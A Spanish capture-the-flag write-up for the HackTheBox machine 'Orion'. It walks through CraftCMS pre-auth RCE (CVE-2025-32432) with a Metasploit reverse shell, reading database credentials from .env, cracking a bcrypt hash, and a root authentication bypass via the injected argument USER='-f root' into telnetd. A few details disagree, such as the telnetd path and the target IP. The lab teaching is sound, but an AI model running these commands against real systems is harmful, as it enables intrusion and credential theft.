
**Plataforma:** HackTheBox  
**Dificultad:** Easy  
**SO:** Linux  
**IP:** 10.129.72.93

---

## Información de la Máquina

Orion es una máquina Linux de dificultad Easy que presenta un bypass de validación CSRF y la exploración de CraftCMS y Telnetd. El acceso inicial se logra mediante la explotación de **CVE-2025-32432** en una versión vulnerable de CraftCMS. Luego, el archivo `.env` de Craft expone credenciales de MySQL que contienen un hash crackeable. La contraseña crackeada está reutilizada y permite acceso SSH al usuario de la máquina. Finalmente, la escalada de privilegios se logra encontrando y explotando una versión vulnerable de telnetd (**CVE-2026-24061**), que permite un bypass de autenticación para obtener root.

---

## Índice

1. [Enumeración](#enumeraci%C3%B3n)
2. [CVE-2025-32432 — Acceso Inicial](#cve-2025-32432--acceso-inicial)
3. [Escalada de Privilegios a Root](#escalada-de-privilegios-a-root)
4. [CVE-2026-24061](#cve-2026-24061)
5. [Explotación](#explotaci%C3%B3n)

---

## Enumeración

Comenzamos con un escaneo de puertos para identificar los servicios expuestos:

```bash
nmap -p- --open --min-rate 4000 -sS -n -Pn 10.129.72.93
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Realizamos un escaneo más detallado sobre los puertos encontrados:

```bash
nmap -p22,80 -sCV 10.129.72.93 -oN escaneo
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
```

El servidor HTTP redirige a `orion.htb`. Agregamos el dominio al archivo `/etc/hosts`:

```bash
echo "10.129.72.93 orion.htb" | sudo tee -a /etc/hosts
```

Identificamos el CMS con `whatweb`:

```bash
whatweb http://orion.htb
```

```
http://orion.htb [200 OK] PoweredBy[CraftCMS], Title[Orion Telecom]
```

La aplicación está construida sobre **CraftCMS**. Realizamos fuzzing de directorios para encontrar endpoints ocultos:

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://orion.htb/FUZZ
```

Encontramos el panel de administración en `/admin`. Al acceder al login, podemos confirmar la versión exacta del CMS: **CraftCMS 5.6.16**.

```bash
searchsploit Craft CMS 5.6.16
```

```
Craft CMS 5.6.16 - RCE  | multiple/webapps/52525.py
CVE: CVE-2025-32432
```

---

## CVE-2025-32432 — Acceso Inicial

### ¿En qué consiste la vulnerabilidad?

**CVE-2025-32432** es una vulnerabilidad de ejecución remota de código **pre-autenticada** que afecta al endpoint `actions/assets/generate-transform` de CraftCMS (versiones ≤ 3.9.14, ≤ 4.14.14 y ≤ 5.6.16).

### Explotación con Metasploit

Dado que el exploit público de searchsploit tiene estos bugs, utilizamos el módulo oficial de Metasploit que maneja correctamente la sesión, el CSRF y el gadget chain:

```bash
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set RPORT 80
set LHOST 10.10.14.225
set TARGET 2
run
```

```
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Meterpreter session 1 opened (10.10.14.225:4444 -> 10.129.244.146:59290)
```

Obtenemos una shell interactiva:

```bash
meterpreter > shell
$ script /dev/null -c /bin/bash
www-data@orion:~/html/craft/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Credenciales en .env y base de datos

Enumeramos el sistema de archivos y encontramos el archivo de configuración de CraftCMS:

```bash
cat /var/www/html/craft/.env
```

```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_DATABASE=orion
```

Credenciales de MySQL expuestas en texto plano. Accedemos a la base de datos:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' orion -e \
  "select id, username, email, password from users;"
```

```
+----+----------+----------------+--------------------------------------------------------------+
| id | username | email          | password                                                     |
+----+----------+----------------+--------------------------------------------------------------+
|  1 | admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----+----------+----------------+--------------------------------------------------------------+
```

El email `adam@orion.htb` indica que existe un usuario del sistema llamado **adam**. Guardamos el hash bcrypt y lo crackeamos:

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
darkangel  (?)
1g 0:00:00:33 DONE
```

Credenciales: `adam:darkangel`

Nos conectamos por SSH:

```bash
ssh adam@10.129.72.93
# Password: darkangel

adam@orion:~$ cat user.txt
[USER FLAG]
```

---

## Escalada de Privilegios a Root

Enumeramos los servicios activos en el sistema:

```bash
ss -lntp
```

```
LISTEN  0  10  127.0.0.1:23  0.0.0.0:*
```

Puerto 23 (telnet) corriendo únicamente en localhost. Revisamos qué proceso lo gestiona:

```bash
cat /etc/inetd.conf
```

```
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```

El servicio telnet corre como **root** bajo `inetd`. El binario es un ejecutable custom ubicado en `/usr/libexec/telnetd`, no el telnetd estándar del sistema. Verificamos la versión:

```bash
telnet --version
# telnet (GNU inetutils) 2.7
```

---

## CVE-2026-24061

### ¿En qué consiste la vulnerabilidad?

**CVE-2026-24061** es una vulnerabilidad de bypass de autenticación en `inetutils-telnetd` versión 2.7. Durante el proceso de handshake, el servidor telnet lee la variable de entorno `USER` para determinar el usuario con el que autenticarse automáticamente (cuando se usa la opción `-a`). El problema es que el servidor **no valida ni sanitiza** el contenido de esta variable antes de pasarla como argumento al programa `login(1)`.

Al establecer `USER='-f root'`, el valor `-f root` se inyecta como argumento de línea de comandos a `login`. El flag `-f` (_force login without authentication_) indica a `login` que la autenticación ya fue validada externamente, saltándose completamente la verificación de contraseña para el usuario especificado (`root`).

---

## Explotación

Un único comando es suficiente para obtener shell de root:

```bash
env USER='-f root' telnet -a 127.0.0.1 23
```

Desglose del comando:

- **`env USER='-f root'`** — establece la variable de entorno `USER` con el payload malicioso
- **`telnet`** — cliente GNU inetutils 2.7 (la versión vulnerable)
- **`-a`** — activa el login automático, que lee la variable `USER` durante el handshake
- **`-f root`** — inyectado vía `USER`, le indica a `login(1)` que autentique a `root` sin contraseña
- **`127.0.0.1 23`** — conecta al servicio telnetd local que corre como root

```
Connected to 127.0.0.1.
Linux 5.15.0-177-generic (orion)
Welcome to Ubuntu 22.04.5 LTS

root@orion:~# whoami
root

root@orion:~# cat root.txt
[ROOT FLAG]
```

---
